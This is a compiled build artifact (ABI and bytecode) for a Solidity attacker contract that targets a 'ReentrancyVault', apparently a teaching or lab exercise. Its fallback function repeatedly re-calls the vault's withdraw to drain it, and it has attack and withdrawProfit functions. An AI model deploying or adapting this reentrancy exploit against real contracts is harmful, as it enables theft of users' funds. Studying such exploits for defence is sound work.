{"abi":[{"type":"constructor","inputs":[{"name":"_vault","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"fallback","stateMutability":"payable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"callCount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"fundVault","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"getBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"owner","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"vault","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract ReentrancyVault"}],"stateMutability":"view"},{"type":"function","name":"withdrawProfit","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x608060405234801561000f575f80fd5b5060405161051938038061051983398101604081905261002e9161005b565b5f80546001600160a01b039092166001600160a01b03199283161790556001805490911633179055610088565b5f6020828403121561006b575f80fd5b81516001600160a01b0381168114610081575f80fd5b9392505050565b610484806100955f395ff3fe608060405260043610610073575f3560e01c80638da5cb5b1161004d5780638da5cb5b1461014f578063959499b614610186578063f7800e691461019a578063fbfa77cf146101a25761007a565b806312065fe0146100fa5780634b28f9a21461011b57806364dd891a146101305761007a565b3661007a57005b60028054905f61008983610413565b90915550505f546001600160a01b03163180156100f8575f54604051632e1a7d4d60e01b81523460048201526001600160a01b0390911690632e1a7d4d906024015f604051808303815f87803b1580156100e1575f80fd5b505af11580156100f3573d5f803e3d5ffd5b505050505b005b348015610105575f80fd5b50475b6040519081526020015b60405180910390f35b348015610126575f80fd5b5061010860025481565b34801561013b575f80fd5b506100f861014a366004610437565b6101c0565b34801561015a575f80fd5b5060015461016e906001600160a01b031681565b6040516001600160a01b039091168152602001610112565b348015610191575f80fd5b506100f861026b565b6100f8610381565b3480156101ad575f80fd5b505f5461016e906001600160a01b031681565b6001546001600160a01b0316331461020b5760405162461bcd60e51b81526020600482015260096024820152682737ba1037bbb732b960b91b60448201526064015b60405180910390fd5b5f600281905554604051632e1a7d4d60e01b8152600481018390526001600160a01b0390911690632e1a7d4d906024015f604051808303815f87803b158015610252575f80fd5b505af1158015610264573d5f803e3d5ffd5b5050505050565b6001546001600160a01b031633146102b15760405162461bcd60e51b81526020600482015260096024820152682737ba1037bbb732b960b91b6044820152606401610202565b47806102eb5760405162461bcd60e51b8152602060048201526009602482015268139bc81c1c9bd99a5d60ba1b6044820152606401610202565b6001546040515f916001600160a01b03169083908381818185875af1925050503d805f8114610335576040519150601f19603f3d011682016040523d82523d5f602084013e61033a565b606091505b505090508061037d5760405162461bcd60e51b815260206004820152600f60248201526e151c985b9cd9995c8819985a5b1959608a1b6044820152606401610202565b5050565b5f34116103c85760405162461bcd60e51b8152602060048201526015602482015274135d5cdd081cd95b9908115512081d1bc8199d5b99605a1b6044820152606401610202565b5f8054906101000a90046001600160a01b03166001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b158015610252575f80fd5b5f6001820161043057634e487b7160e01b5f52601160045260245ffd5b5060010190565b5f60208284031215610447575f80fd5b503591905056fea264697066735822122038c4ccc6a506e4456039b5e615e784e5a7e4d7bb711bc934e3b33d4a2fc41a4264736f6c63430008180033","linkReferences":{}},"methodIdentifiers":{"attack(uint256)":"64dd891a","callCount()":"4b28f9a2","fundVault()":"f7800e69","getBalance()":"12065fe0","owner()":"8da5cb5b","vault()":"fbfa77cf","withdrawProfit()":"959499b6"},"id":6}